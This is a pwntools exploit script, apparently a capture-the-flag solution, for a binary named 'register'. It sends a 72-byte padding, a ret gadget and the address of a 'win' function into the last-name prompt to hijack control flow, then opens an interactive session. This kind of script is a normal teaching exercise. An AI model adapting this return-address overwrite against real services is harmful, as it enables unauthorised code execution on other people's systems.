#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or './register')

host = args.HOST or '127.0.0.1'
port = int(args.PORT or 8889)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

io = start()

io.sendlineafter(b"Enter your first name:", b"bob")

ret = 0x0000000000401016
payload = b"A"*72
payload+= p64(ret)
payload+= p64(exe.symbols.win)

io.sendlineafter(b"Enter your last name:", payload)
io.sendlineafter(b"Enter your age:", b"12")

io.interactive()
